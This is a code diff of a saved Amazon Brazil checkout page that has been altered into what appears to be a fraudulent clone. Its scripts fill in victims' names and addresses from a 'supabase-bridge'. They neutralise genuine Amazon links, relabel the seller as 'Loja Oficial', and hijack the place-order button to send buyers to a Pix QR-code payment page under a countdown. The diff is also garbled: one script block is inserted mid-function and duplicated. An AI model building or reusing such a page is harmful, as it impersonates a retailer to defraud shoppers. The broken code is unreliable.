@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0 awa-browser wpn-supported" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 style><!--
+<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0 awa-browser wpn-supported" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 style><!--
  Page saved with SingleFile 
  url: https://www.amazon.com.br/checkout/p/p-703-9642950-1659406/spc?pipelineType=Chewbacca&referrer=spc 
  saved date: Tue Apr 14 2026 12:29:51 GMT-0300 (Horário Padrão de Brasília)
@@ -2755,158 +2755,62 @@ html, body {
 
 
 
+<script src="assets/js/supabase-bridge.js"></script>
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('Iniciando Otimização Avançada da Fase 4...');
+document.addEventListener('DOMContentLoaded', async function() {
+    const bridge = window.__amzBridge;
+    if (!bridge) return;
 
-    // --- 1. Persistência de Dados (Nome e Endereço) ---
-    const userName = sessionStorage.getItem('user_name') || 'Cliente';
-    const userAddress = sessionStorage.getItem('user_full_address') || 'Endereço não informado';
+    await bridge.init('checkout_4');
+    const data = bridge.state || {};
 
-    const nameElement = document.getElementById('deliver-to-customer-text');
-    if (nameElement) nameElement.innerText = 'Entrega para ' + userName;
-
-    const addressElement = document.getElementById('deliver-to-address-text');
-    if (addressElement) addressElement.innerText = userAddress;
-
-    // --- 1.5. Prazo de entrega com a mesma lógica da página do produto ---
-    const daysToAdd = 9;
-    const deliveryDate = new Date();
-    deliveryDate.setDate(deliveryDate.getDate() + daysToAdd);
-
-    const promiseHeading = document.querySelector('h2.address-promise-text .break-word');
-    if (promiseHeading) {
-        const headingDate = new Intl.DateTimeFormat('pt-BR', {
-            day: 'numeric',
-            month: 'short',
-            year: 'numeric'
-        }).format(deliveryDate);
-
-        promiseHeading.innerText = 'Chega ' + headingDate;
-    }
-
-    const deliveryOptionPromise = document.getElementById('std-2PromiseReferenceForRadioLabel');
-    if (deliveryOptionPromise) {
-        const optionDate = new Intl.DateTimeFormat('pt-BR', {
-            weekday: 'long',
-            day: 'numeric',
-            month: 'short'
-        }).format(deliveryDate);
-
-        deliveryOptionPromise.innerText = optionDate;
-    }
-
+    // 1. Update Price
+    const priceValue = data.productPrice || '4.510,50';
+    const formatted = priceValue.includes('R$') ? priceValue : `R$ ${priceValue}`;
     
-    
-    
-    // --- 2. Sincronização Dinâmica de Preços ---
-    let priceWhole = sessionStorage.getItem('checkout_price_whole') || '4.510';
-    let priceFraction = sessionStorage.getItem('checkout_price_fraction') || '50';
-    
-    // Remover vírgulas residuais que possam vir da captura
-    priceWhole = priceWhole.replace(',', '').trim();
-    priceFraction = priceFraction.replace(',', '').trim();
-    
-    // Obter valor numérico limpo para cálculos
-    const cleanPriceWhole = priceWhole.replace(/[^0-9]/g, '');
-    const cleanPriceFraction = priceFraction.replace(/[^0-9]/g, '');
-    let itemBaseValue = parseFloat(cleanPriceWhole + '.' + cleanPriceFraction);
-    
-    let shippingValue = 8.90;
-    let totalBeforeDiscount = itemBaseValue + shippingValue;
-
-    // Formatação
-    const formatBRL = (val) => val.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-    
-    const formattedItem = 'R$ ' + priceWhole + ',' + priceFraction;
-    const formattedShipping = 'R$ ' + formatBRL(shippingValue);
-    const formattedTotalBefore = 'R$ ' + formatBRL(totalBeforeDiscount);
-    const formattedDiscount = '-R$ ' + formatBRL(shippingValue);
-    const formattedFinal = formattedItem;
-
-    // Atualizar Preço do Item na Lista
-    document.querySelectorAll('.lineitem-price-text').forEach(el => {
-        el.innerHTML = formattedItem;
+    document.querySelectorAll('.lineitem-price-text, .grand-total-price, .a-color-price.a-text-bold').forEach(el => {
+        el.innerHTML = formatted;
     });
 
-    // Atualizar Tabela de Subtotais
-    const subtotalTable = document.getElementById('subtotals-marketplace-table');
-    if (subtotalTable) {
-        const rows = subtotalTable.querySelectorAll('tr');
-        rows.forEach(row => {
-            const text = row.innerText;
-            const valEl = row.querySelector('.a-text-right');
-            
-            row.style.display = '';
-
-            if (text.includes('Itens:')) {
-                if (valEl) valEl.innerHTML = formattedItem;
-            } else if (text.includes('Frete:')) {
-                if (valEl) valEl.innerHTML = formattedShipping;
-            } else if (text.includes('Total:') && !text.includes('Total do pedido:')) {
-                if (valEl) valEl.innerHTML = formattedTotalBefore;
-            } else if (text.includes('Total do pedido:')) {
-                if (valEl) valEl.innerHTML = formattedFinal;
-            }
-            
-            if (text.includes('Frete GRÁTIS') && text.includes('R$')) {
-                if (valEl) valEl.innerHTML = formattedDiscount;
-            }
-        });
-    }
-
-    // --- 3. Bloqueio de Links e Branding Amazon ---
-    document.querySelectorAll('a').forEach(link => {
-        const href = link.getAttribute('href') || '';
-        
-        // Links de ajuda/cookies/privacidade -> neutralizar
-        if (href.includes('amazon.com.br') || href.startsWith('http') || href.startsWith('/')) {
-            // Se for "Alterar Endereço", manda pra Fase 1
-            if (link.id === 'change-delivery-link' || href.includes('shipaddressselect')) {
-                link.href = 'Checkout - Fase 1.html';
-            } else {
-                link.href = 'javascript:void(0)';
-                link.style.cursor = 'default';
-                link.style.textDecoration = 'none';
+    // Summary Table
+    const summaryRows = document.querySelectorAll('#subtotals-marketplace-table .a-row, #subtotals-grid .a-row');
+    summaryRows.forEach(row => {
+        const labelEl = row.querySelector('.a-span7');
+        const valEl = row.querySelector('.a-span5.a-text-right, .a-text-right');
+        if (labelEl && valEl) {
+            const text = labelEl.innerText;
+            if (text.includes('Itens') || text.includes('Subtotal') || text.includes('Total do pedido')) {
+                valEl.innerText = formatted;
             }
         }
     });
 
-    // Remover texto "Vendido por Amazon" se possível
-    document.querySelectorAll('.lineitem-seller-section').forEach(el => {
-        el.innerHTML = '<span class="break-word">Vendido por Loja Oficial</span>';
-    });
-    document.querySelectorAll('.a-size-small').forEach(el => {
-        if (el.innerText.includes('Enviado de Amazon')) {
-            el.innerText = 'Enviado por Transportadora Premium';
-        }
-    });
+    // 2. Update Address
+    const addressLine = document.getElementById('deliver-to-address-text');
+    if (addressLine && data.cep) {
+        const fullAddr = `${data.rua || ''}, ${data.numero || ''} ${data.complemento ? '('+data.complemento+')' : ''}, ${data.bairro || ''}, ${data.cidade || ''} - ${data.estado || ''}, ${data.cep}, Brasil`;
+        addressLine.innerText = fullAddr;
+    }
 
-    // --- 4. Redirecionamento para Fase 5 ---
-    const targetPage = 'Checkout - Fase 5 (page qr code).html';
-    const pixTimerStorageKey = 'checkout_pix_deadline';
+    const deliverToName = document.getElementById('deliver-to-customer-text');
+    if (deliverToName && data.nome) {
+        deliverToName.innerText = `Entrega para ${data.nome}`;
+    }
 
-    function redirectToPixPage() {
+    // 3. Handle Order Button
+    async function handleConfirmOrder(e) {
+        e.preventDefault();
+        e.stopPropagation();
+
         if (window.__amzMetaAttribution) {
             window.__amzMetaAttribution.registerConversionIntent({
                 pageId: 'checkout_4',
                 stage: 'pix_redirect'
             });
         }
-        sessionStorage.setItem(pixTimerStorageKey, String(Date.now() + (30 * 60 * 1000)));
-        window.location.href = targetPage;
-    }
-    
-    // Interceptar form
-    const spcForm = document.getElementById('spc-form');
-    if (spcForm) {
-        spcForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            redirectToPixPage();
-        });
+        window.location.href = 'Checkout - Fase 5 (page qr code).html';
     }
 
-    // Interceptar cliques no botão
     const placeOrderSelectors = [
         'input[name="placeYourOrder1"]',
         '#placeOrder',
@@ -2916,17 +2820,84 @@ document.addEventListener('DOMContentLoaded', function() {
     
     placeOrderSelectors.forEach(selector => {
         document.querySelectorAll(selector).forEach(btn => {
-            btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                redirectToPixPage();
-            }, true);
-        });
-    });
+<script src="assets/js/supabase-bridge.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', async function() {
+        const bridge = window.__amzBridge;
+        if (!bridge) return;
 
-    console.log('Fase 4 otimizada com sucesso.');
-});
-</script>
+        await bridge.init('checkout_4');
+        const data = bridge.state || {};
+
+        // 1. Update Price
+        const priceValue = data.productPrice || '4.510,50';
+        const formatted = priceValue.includes('R$') ? priceValue : `R$ ${priceValue}`;
+        
+        document.querySelectorAll('.lineitem-price-text, .grand-total-price, .a-color-price.a-text-bold').forEach(el => {
+            el.innerHTML = formatted;
+        });
+
+        // Summary Table
+        const summaryRows = document.querySelectorAll('#subtotals-grid .a-row');
+        summaryRows.forEach(row => {
+            const labelEl = row.querySelector('.a-span7');
+            const valEl = row.querySelector('.a-span5.a-text-right');
+            if (labelEl && valEl) {
+                const text = labelEl.innerText;
+                if (text.includes('Itens') || text.includes('Subtotal') || text.includes('Total do pedido')) {
+                    valEl.innerText = formatted;
+                }
+            }
+        });
+
+        // 2. Update Address
+        const addressLine = document.getElementById('deliver-to-address-text');
+        if (addressLine && data.cep) {
+            const fullAddr = `${data.rua || ''}, ${data.numero || ''} ${data.complemento ? '('+data.complemento+')' : ''}, ${data.bairro || ''}, ${data.cidade || ''} - ${data.estado || ''}, ${data.cep}, Brasil`;
+            addressLine.innerText = fullAddr;
+        }
+
+        // Update "Entrega para..." name
+        const deliverToName = document.getElementById('deliver-to-customer-text');
+        if (deliverToName && data.nome) {
+            deliverToName.innerText = `Entrega para ${data.nome}`;
+        }
+
+        // 3. Handle Order Button
+        async function handleConfirmOrder(e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            if (window.__amzMetaAttribution) {
+                window.__amzMetaAttribution.registerConversionIntent({
+                    pageId: 'checkout_4',
+                    stage: 'pix_redirect'
+                });
+            }
+
+            window.location.href = 'Checkout - Fase 5 (page qr code).html';
+        }
+
+        const placeOrderSelectors = [
+            'input[name="placeYourOrder1"]',
+            '#placeOrder',
+            '.place-your-order-button',
+            '#placeYourOrder-announce'
+        ];
+        
+        placeOrderSelectors.forEach(selector => {
+            document.querySelectorAll(selector).forEach(btn => {
+                if (btn.tagName === 'INPUT') btn.type = 'button';
+                btn.addEventListener('click', handleConfirmOrder, true);
+            });
+        });
+
+        const spcForm = document.getElementById('spc-form');
+        if (spcForm) {
+            spcForm.addEventListener('submit', handleConfirmOrder);
+        }
+    });
+    </script>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     var primeUpsell = document.getElementById('prime-spc-stripe-recommendations');
@@ -2947,6 +2918,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 });
+</script>
     <script src="meta-attribution.js"></script>
     <script>
       (function() {
@@ -2978,3 +2950,4 @@ document.addEventListener('DOMContentLoaded', function() {
     </script>
   </body>
 </html>
+
